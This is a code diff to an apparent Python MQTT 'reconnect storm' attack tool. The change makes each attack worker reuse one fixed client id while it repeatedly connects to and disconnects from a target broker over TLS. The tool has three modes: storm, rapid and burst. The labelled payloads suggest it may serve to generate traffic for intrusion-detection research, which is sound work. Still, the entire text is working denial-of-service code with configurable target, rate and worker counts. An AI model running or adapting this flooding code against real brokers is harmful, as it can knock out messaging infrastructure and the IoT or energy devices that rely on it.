@@ -10,7 +10,7 @@ import os
 from datetime import datetime, timezone
 
 def make_client_id(device_base: str, index: int,
-                   prefix: str = "energy-", suffix: str = "replayer",
+                   prefix: str = "reconnect-", suffix: str = "replayer",
                    sep: str = "-") -> str:
     device = str(device_base).strip().replace(" ", "_")
     idx = int(index)
@@ -110,52 +110,60 @@ class ReconnectStormAttackTLS:
         idx = worker_id * 10000 + (reconnect_index + 1)
         return make_client_id(device_base, idx)
 
+    def _get_fixed_client_id(self, worker_id: int) -> str:
+        """
+        Return a fixed client id per worker (does NOT change across reconnects).
+        Uses worker_id+1 so ids are 1-based for readability.
+        """
+        device_base = self.fallback_device_types[worker_id % len(self.fallback_device_types)]
+        idx = worker_id + 1
+        return make_client_id(device_base, idx)
+
     def reconnect_storm_worker(self, worker_id, num_reconnects=50, min_delay_ms=10, max_delay_ms=100, username=None, password=None):
         print(f" Worker {worker_id}: Starting reconnect storm attack...")
+        client_id = self._get_fixed_client_id(worker_id)
+        client = self.create_client(client_id, username, password)
+
+        if not client:
+            print(f" Worker {worker_id}: Failed to create client {client_id}")
+            self.attack_stats["connections_failed"] += num_reconnects
+            return
+
+        def on_connect(client_obj, userdata, flags, rc):
+            if rc == 0:
+                self.attack_stats["connections_successful"] += 1
+                # publish a few short messages to indicate connection
+                # for i in range(3):
+                #     try:
+                #         payload = {
+                #             "timestamp": datetime.now(timezone.utc).isoformat(),
+                #             "packet_type": "CONNECT",
+                #             "client_id": client_id,
+                #             "src_ip": "127.0.0.1",
+                #             "attack_signature": "R9_CONNECT_RETRY_STORM",
+                #             "worker_id": worker_id,
+                #             "message_id": i,
+                #             "keepalive": 60,
+                #             "storm_data": "S" * random.randint(20, 120)
+                #         }
+                #         info = client_obj.publish("test/reconnect", json.dumps(payload), qos=0)
+                #         if getattr(info, "rc", 1) == 0:
+                #             self.attack_stats["messages_sent"] += 1
+                #     except Exception:
+                #         pass
+                # small pause to allow publish to be processed
+                time.sleep(random.uniform(0.05, 0.2))
+            else:
+                self.attack_stats["connections_failed"] += 1
+
+        def on_disconnect(client_obj, userdata, rc):
+            self.attack_stats["disconnections"] += 1
+
+        client.on_connect = on_connect
+        client.on_disconnect = on_disconnect
+
         for reconnect in range(num_reconnects):
             try:
-                client_id = self._get_client_id_for_reconnect(worker_id, reconnect)
-                client = self.create_client(client_id, username, password)
-
-                if not client:
-                    self.attack_stats["connections_failed"] += 1
-                    continue
-
-                def on_connect(client_obj, userdata, flags, rc):
-                    if rc == 0:
-                        self.attack_stats["connections_successful"] += 1
-                        if reconnect % 10 == 0:
-                            print(f" Worker {worker_id} ({client_id}): Reconnect {reconnect+1} successful")
-                        # publish a few short messages to indicate connection
-                        for i in range(3):
-                            try:
-                                payload = {
-                                    "timestamp": datetime.now(timezone.utc).isoformat(),
-                                    "packet_type": "CONNECT",
-                                    "client_id": client_id,
-                                    "src_ip": "127.0.0.1",
-                                    "attack_signature": "R9_CONNECT_RETRY_STORM",
-                                    "worker_id": worker_id,
-                                    "reconnect_id": reconnect + 1,
-                                    "message_id": i,
-                                    "keepalive": 60,
-                                    "storm_data": "S" * random.randint(20, 120)
-                                }
-                                info = client_obj.publish("test/reconnect", json.dumps(payload), qos=0)
-                                if getattr(info, "rc", 1) == 0:
-                                    self.attack_stats["messages_sent"] += 1
-                            except Exception:
-                                pass
-                        time.sleep(random.uniform(0.05, 0.2))
-                    else:
-                        self.attack_stats["connections_failed"] += 1
-
-                def on_disconnect(client_obj, userdata, rc):
-                    self.attack_stats["disconnections"] += 1
-
-                client.on_connect = on_connect
-                client.on_disconnect = on_disconnect
-
                 client.connect(self.broker_host, self.broker_port, 60)
                 client.loop_start()
 
@@ -166,6 +174,9 @@ class ReconnectStormAttackTLS:
 
                 client.loop_stop()
                 client.disconnect()
+
+                if reconnect % 10 == 0:
+                    print(f" Worker {worker_id} ({client_id}): Reconnect {reconnect+1} successful")
 
                 time.sleep(random.uniform(min_delay_ms, max_delay_ms) / 1000.0)
 
@@ -178,42 +189,45 @@ class ReconnectStormAttackTLS:
 
     def rapid_reconnect_worker(self, worker_id, duration_seconds=30, reconnect_interval_ms=50, username=None, password=None):
         print(f" Worker {worker_id}: Starting rapid reconnect attack...")
+        client_id = self._get_fixed_client_id(worker_id)
+        client = self.create_client(client_id, username, password)
+
+        if not client:
+            print(f" Worker {worker_id}: Failed to create client {client_id}")
+            self.attack_stats["connections_failed"] += 1
+            return
+
+        def on_connect(client_obj, userdata, flags, rc):
+            if rc == 0:
+                self.attack_stats["connections_successful"] += 1
+            else:
+                self.attack_stats["connections_failed"] += 1
+
+        def on_disconnect(client_obj, userdata, rc):
+            self.attack_stats["disconnections"] += 1
+
+        client.on_connect = on_connect
+        client.on_disconnect = on_disconnect
+
         start_time = time.time()
         reconnect_count = 0
         while time.time() - start_time < duration_seconds:
             try:
-                client_id = self._get_client_id_for_reconnect(worker_id, reconnect_count)
-                client = self.create_client(client_id, username, password)
-
-                if not client:
-                    self.attack_stats["connections_failed"] += 1
-                    reconnect_count += 1
-                    continue
-
-                def on_connect(client_obj, userdata, flags, rc):
-                    if rc == 0:
-                        self.attack_stats["connections_successful"] += 1
-                        if reconnect_count % 20 == 0:
-                            print(f" Worker {worker_id} ({client_id}): Rapid reconnect {reconnect_count+1} successful")
-                    else:
-                        self.attack_stats["connections_failed"] += 1
-
-                def on_disconnect(client_obj, userdata, rc):
-                    self.attack_stats["disconnections"] += 1
-
-                client.on_connect = on_connect
-                client.on_disconnect = on_disconnect
-
                 client.connect(self.broker_host, self.broker_port, 60)
                 client.loop_start()
 
                 self.attack_stats["reconnect_attempts"] += 1
                 reconnect_count += 1
 
+                # short active connect period
                 time.sleep(0.02)
 
                 client.loop_stop()
                 client.disconnect()
+
+                if reconnect_count % 20 == 0:
+                    print(f" Worker {worker_id} ({client_id}): Rapid reconnect {reconnect_count} successful")
+
                 time.sleep(reconnect_interval_ms / 1000.0)
 
             except Exception as e:
@@ -226,41 +240,39 @@ class ReconnectStormAttackTLS:
 
     def burst_reconnect_worker(self, worker_id, burst_size=20, burst_interval_ms=1000, num_bursts=10, username=None, password=None):
         print(f" Worker {worker_id}: Starting burst reconnect attack...")
+        client_id = self._get_fixed_client_id(worker_id)
+        client = self.create_client(client_id, username, password)
+
+        if not client:
+            print(f" Worker {worker_id}: Failed to create client {client_id}")
+            self.attack_stats["connections_failed"] += burst_size * num_bursts
+            return
+
+        def on_connect(client_obj, userdata, flags, rc):
+            if rc == 0:
+                self.attack_stats["connections_successful"] += 1
+            else:
+                self.attack_stats["connections_failed"] += 1
+
+        def on_disconnect(client_obj, userdata, rc):
+            self.attack_stats["disconnections"] += 1
+
+        client.on_connect = on_connect
+        client.on_disconnect = on_disconnect
+
+        # For "burst" mode we reuse the same client id but perform 'burst_size' sequential connect/disconnect cycles per burst.
         for burst in range(num_bursts):
-            clients = []
             for i in range(burst_size):
                 try:
-                    reconnect_index = burst * burst_size + i
-                    client_id = self._get_client_id_for_reconnect(worker_id, reconnect_index)
-                    client = self.create_client(client_id, username, password)
-                    if client:
-                        clients.append((client_id, client))
-                except Exception:
-                    self.attack_stats["connections_failed"] += 1
-
-            for client_id, client in clients:
-                try:
-                    def on_connect(client_obj, userdata, flags, rc):
-                        if rc == 0:
-                            self.attack_stats["connections_successful"] += 1
-                        else:
-                            self.attack_stats["connections_failed"] += 1
-
-                    def on_disconnect(client_obj, userdata, rc):
-                        self.attack_stats["disconnections"] += 1
-
-                    client.on_connect = on_connect
-                    client.on_disconnect = on_disconnect
-
                     client.connect(self.broker_host, self.broker_port, 60)
                     client.loop_start()
                     self.attack_stats["reconnect_attempts"] += 1
                 except Exception:
                     self.attack_stats["connections_failed"] += 1
+                    continue
 
-            time.sleep(0.2)
+                time.sleep(0.2)  # small active time for each client in the burst
 
-            for client_id, client in clients:
                 try:
                     client.loop_stop()
                     client.disconnect()
